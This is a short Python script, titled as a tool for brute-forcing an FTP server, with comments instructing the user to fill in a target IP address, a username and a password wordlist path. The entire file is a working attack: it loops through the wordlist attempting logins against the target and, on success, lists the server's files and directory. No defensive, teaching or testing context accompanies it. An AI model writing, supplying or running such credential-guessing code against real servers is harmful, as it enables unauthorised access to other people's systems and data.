#Bruteforcing FTP Server

#Importing FTP Library
import ftplib
Server = ftplib.FTP()

#Bruteforcing FTP Using Error Handling
try:
    #Please replace [IP Address Here] with target IP Address
    print("Connecting to [IP Address Here]")

    #Please replace Enter IP Address with target IP Address, Change port number if applicable.
    Server.connect("Enter IP Address", 21)

#Unknown Errors Handling
except Exception as error:
    print("Error: %s" %error)

#Please replace yourwordlistfilepath with password file path
myfile = open("yourwordlistfilepath", 'r')

#For loop to try passwords in file
for line in myfile:

    #Post Checking there is a null character, so the following line removes the null character.
    line = line.rstrip('\n')

    #Confirmation to user which password is being used
    print("Trying with password %s" %line)

    try:
        Server.login("username here",line)

    except ftplib.error_perm:
        print("Incorrect Username/Password")

    except ftplib.error_temp:
        print("Unable to Contact Server")
        
    else:
        print("Connected")
        print(Server)
        Server.dir()
        print(Server.pwd())
        break
myfile.close()
